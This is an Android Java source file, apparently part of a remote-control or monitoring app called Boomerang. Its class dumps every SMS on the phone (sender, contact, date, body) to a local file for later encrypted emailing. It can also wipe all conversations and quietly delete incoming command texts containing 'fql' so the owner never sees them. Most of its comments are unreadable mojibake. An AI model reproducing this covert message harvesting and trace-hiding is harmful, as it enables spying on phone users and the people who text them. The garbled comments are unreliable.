package Boomerang_android15.com;


import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;


import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

public class OperateSMS 
{
    /** Called when the activity is first created. */
 
    private String m_smsFullName; //��������绰����Ϣ���ļ����ļ���ȫ·��
    private BufferedWriter m_bw;  //д����Ҳ���Կ���ʹ�� FileOutputStream ��ʽ
    private File m_smsFile; //��������绰����Ϣ���ļ����ļ�����
  
  

    //������Ϣ���
    SetInformation m_settingInfor;    //�����ļ���������Ϣ
    String m_configFilePath;  //�����ļ���·��
    
    //�������
    FqlEmail m_mailPort;  //ͨ�������ʼ��Ľӿ�
    

    //֧�ּ��ܹ���
	encryption myEncrpt = new encryption();
	
	Context m_context;
	

    
    public OperateSMS(Context context)
    {
    	
    	String strUriInbox = "content://sms/inbox";		//SMS_INBOX:1
    	String strUriFailed = "content://sms/failed";	//SMS_FAILED:2
    	String strUriQueued = "content://sms/queued";	//sms_queued:3
    	String strUriSent = "content://sms/sent";	//sms_sent:4
    	String strUriDraft = "content://sms/draft";	//sms_draft:5
    	String strUriOutbox = "content://sms/outbox";	//sms_outbox
    	String strUriUndelibered = "content://sms/undelivered";	//sms_undelivered δ�ʹ��
    	String strUriAll = "content://sms/all"; //SMS_all
    	String strUriConversations = "content://sms/conversations";
    	m_context = context;
    	initialize();
    }
    

    
    //////////////////////////////////////////////////////////
    //
    //��������:��ʼ��
    //
    /////////////////////////////////////////////////////////////
    private void initialize()
    {
    	//1.��������ļ�·��
        Log.i("333+++", "ProcessPhoneBook initialize: begin!");
        m_configFilePath = m_context.getFilesDir()+ java.io.File.separator + m_context.getString(R.string.config_file);
   
        //2.��ȡ�����ļ���Ϣ
        m_settingInfor = new  SetInformation(m_configFilePath);     
        m_settingInfor.ReadConfigFile();
   
        //3.��ô����绰���ļ���ȫ·��
        //m_phoneFullName = m_settingInfor.GetDataPath() + java.io.File.separator + m_settingInfor.GetPhoneBookInforName();
        m_smsFullName = m_context.getFilesDir() + java.io.File.separator + m_settingInfor.GetPhoneBookInforName();
        
		///////////////////////////////////////////
		// 4.���ü�����Կ
		//////////////////////////////////////////////
		String password = m_settingInfor.GetPassWord();
		myEncrpt.SetKey(password.substring(0, 8));
    	
    	
    }//end function
    
    /////////////////////////////////////////////////////////////
    //
    //��������:����������ݵ�ָ���ļ�
    //ע:����Ա�Ķ�
    ////////////////////////////////////////////////////////////////
    private void SaveSMSInfor()
    {
    	//��������绰����Ϣ���ļ�
        CreateSMSFile();                
        
        //���绰���е���Ϣд���ļ�����
        GetSMSText();
        
        //�رյ绰���ļ�
        CloseSMSFile();    	
    	
    }//end function
    
    //////////////////////////////////////////////////////////////
    //
    //��������:��������������ݵ��ļ�
    //Ŀǰ�Ĵ���ʽ��:������������ļ�ɾ�������´���,���ִ���ʽ����
    //�����һ���ķ���,�Ժ���øĳɷ�������������ԭ���ļ��ķ�ʽ.
    ///////////////////////////////////////////////////////////////
    private  void CreateSMSFile()
    {   

        //���ļ���صĲ���      
    	m_smsFile =  new java.io.File(m_smsFullName);  
    
        if (m_smsFile.exists())
        {
            //����ļ��Ѿ����ڽ��ļ�ɾ��
        	m_smsFile.delete();     
        }
        else
        {
            try
            {
            	m_smsFile.createNewFile();
            }
            catch (Exception e)
            {
                e.printStackTrace();        
            }
      
        }//end if   
      
        try
        {
        	OutputStream out = new FileOutputStream(m_smsFile); 
			m_bw  = new BufferedWriter(new OutputStreamWriter(out, "GBK")); 
            //m_bw = new java.io.BufferedWriter(new java.io.FileWriter(m_smsFile));               
           
        }
        catch (IOException e)
        {
          e.printStackTrace();
        }
    
    }//ProcessPhoneBook()
    
    //////////////////////////////////////////////////////////////
    //
    //��������:�رձ���������ݵ��ļ�
    //
    //
    ///////////////////////////////////////////////////////////////
    private void CloseSMSFile()
    {
      
        try
        { 
            m_bw.flush();
            m_bw.close();
            
          
        }
        catch (IOException e)
        {
          e.printStackTrace();
        }
    }
    
    ///////////////////////////////////////////////////////
    //
    //��������:����û��Ķ���Ϣ����,���䱣�浽�ļ���
    //
    ///////////////////////////////////////////////////////
    private void GetSMSText()
    {
		 
		 String strSMSAddress = new String();
		 String StrSMSPerson = new String();
		 String strSMSdate = new String();
		 String strSMSType = new String();
		 String strSMSSubject = new String();
		 String strSMSText = new String();
		 
    	
    	String strUriInbox = "content://sms"; //������������Ķ��Ŷ��г���
    	Uri uriSms = Uri.parse(strUriInbox);  //If you want to access all SMS, just replace the uri string to "content://sms/"
    	Cursor c = m_context.getContentResolver().query(uriSms, null, null, null, null);
    	while (c.moveToNext())
    	 {    
    		 try    
    		 {        
    			 //Read the contents of the SMS;    
    			
    			 //��ȡ���ŵ�����
    			 strSMSAddress = c.getString(2);
    			 StrSMSPerson = c.getString(3);
    			 strSMSdate = c.getString(4);
    			 strSMSType = c.getString(8);
    			 strSMSSubject = c.getString(10);
    			 strSMSText = c.getString(11);
    			 
    			 //������Դ�ֻ���
    	         m_bw.write(strSMSAddress);
    	         m_bw.newLine();
    	         
    	         //������Դ�û���
    	         m_bw.write(StrSMSPerson);
    	         m_bw.newLine();
    	         
    	         //����,����ʱ��
    	         m_bw.write(strSMSdate);
    	         m_bw.newLine();
    	         
    	         //��ʾ�����ռ���/������/���ǲݸ�����
    	         m_bw.write(strSMSType);
    	         m_bw.newLine();
    	         
    	         //��������
    	         m_bw.write(strSMSSubject);
    	         m_bw.newLine();
    	         
    	         //��������
    	         m_bw.write(strSMSText);
    	         m_bw.newLine();
    	         
    	         m_bw.write(" ");
    	         m_bw.newLine();
    		
    			 
    		
    		 }    
    		 catch (Exception e)    
    		 {    
    			 
    		 }//end try
    	} //end while    	
    	
    }
    
    private void SendSMSFile()
    {
    	
    	
    	
    }//end function
    
    
    /////////////////////////////////////////////////////////////
    //
    //��������:ɾ�����ж���
    //
    //
    //////////////////////////////////////////////////////////////////
    private void DelAllSMS()
    {

		String pid = new String();
		String uri = new String();
    	
    	String strUriInbox = "content://sms";
    	Uri uriSms = Uri.parse(strUriInbox);  //If you want to access all SMS, just replace the uri string to "content://sms/"
    	Cursor c = m_context.getContentResolver().query(uriSms, null, null, null, null);
    	while (c.moveToNext())
    	{        
    		pid = c.getString(c.getColumnIndex("thread_id"));  //Get thread id;        
        	uri = "content://sms/conversations/" + pid;        
        	m_context.getContentResolver().delete(Uri.parse(uri), null, null); 
    		
    	} //end while    	
    	
    	
    }//end function
    
    ///////////////////////////////////////////////////////////
    //
    //��������:ɾ����¼�������ݵ��ļ�
    //
    //
    ////////////////////////////////////////////////////////////
    private void DelSMSFile()
    {
    	
    }//end function
    
    //////////////////////////////////////////////////////////
    //
    //��������:ɾ��ָ����ƶ���
    //
    //////////////////////////////////////////////////////////
    public void deleteCommandSMS()
    {
    	             
    	String strSMSText = new String();
    	String strStandardText = new String();
		String pid = new String();
		String ids [] = new String[1];
		String uri = new String();
		int index = 0;
		int count = 0;
    	
    	String strUriInbox = "content://sms/inbox";
    	Uri uriSms = Uri.parse(strUriInbox);  //If you want to access all SMS, just replace the uri string to "content://sms/"
    	Cursor c = m_context.getContentResolver().query(uriSms, null, null, null, null);
    	String names[] = c.getColumnNames();
    	
    	c.moveToFirst();
    	do
    	{    
    		try    
    		{        
     			strSMSText = c.getString(c.getColumnIndex("body"));  //��ophone�б������������12��.��andriod�������������11��.  			 
    			if (strSMSText == null)
    			{
    				//��������Ϊ��
    				break;
    			}
    			strStandardText = strSMSText.toLowerCase();
    			Log.i("333+++", "strStandardText:");
				Log.i("333+++",strStandardText);
    			index = strStandardText.indexOf("fql"); //����String�е�substring,Ĭ�ϴ�0λ��ʼ
    			if (-1 != index)
    			{
    				
    				//��Ч����Ϣ
    				
    				ids[0] = c.getString(c.getColumnIndex("_id"));
    				pid = c.getString(c.getColumnIndex("thread_id"));  //Get thread id;     
    				
   
        			uri = "content://sms/conversations/" + pid;        
        			m_context.getContentResolver().delete(Uri.parse(uri), "_id=?", ids); 
    					
    			}//end if
    			 
    		
    		}    
    		catch (Exception e)    
    		{    
    			Log.i("333+++", "Exception e");
    			
    		}//end try
    	}
    	while (c.moveToNext());//end while    	
    	
    }//end function

    
    //////////////////////////////////////////////////////////////////////
    //
    //��������:���ܶ����ļ�
    //
    /////////////////////////////////////////////////////////////////////////
    private void EncrptSMSFile()
    {
    	
    	
    }//end function
    

    
    
}

/*
for(int i=0; i<c.getColumnCount(); i++)        
{            
	 strColumnName = c.getColumnName(i);            
	 strColumnValue = c.getString(i);  
	
}//end for       

//Delete the SMS      

String pid = c.getString(1);  //Get thread id;        
String uri = "content://sms/conversations/" + pid;        
getContentResolver().delete(Uri.parse(uri), null, null);      
*/     